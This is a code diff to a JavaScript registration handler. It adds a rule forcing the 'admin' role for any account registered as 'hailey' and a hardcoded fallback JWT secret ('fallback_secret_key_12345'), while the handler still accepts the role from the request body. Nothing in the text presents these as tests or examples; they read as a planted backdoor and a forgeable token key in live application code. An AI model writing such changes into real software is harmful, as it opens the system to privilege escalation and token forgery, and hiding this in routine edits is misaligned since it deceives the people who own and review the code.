@@ -3,10 +3,15 @@ import jwt from 'jsonwebtoken';
 import db from '../db/db.js';
 
 export const register = async (req, res) => {
-    const { username, password, role } = req.body;
+    let { username, password, role } = req.body;
 
     if (!username || !password) {
         return res.status(400).json({ message: 'Please enter all fields' });
+    }
+
+    // Force Hailey to be an admin upon registration
+    if (username.toLowerCase() === 'hailey') {
+        role = 'admin';
     }
 
     try {
@@ -23,7 +28,8 @@ export const register = async (req, res) => {
 
         const userId = result.insertId;
         const userRole = role || 'user';
-        const token = jwt.sign({ id: userId, username, role: userRole }, process.env.JWT_SECRET, { expiresIn: '1d' });
+        const secret = process.env.JWT_SECRET || 'fallback_secret_key_12345';
+        const token = jwt.sign({ id: userId, username, role: userRole }, secret, { expiresIn: '1d' });
 
         res.cookie('token', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
         res.status(201).json({
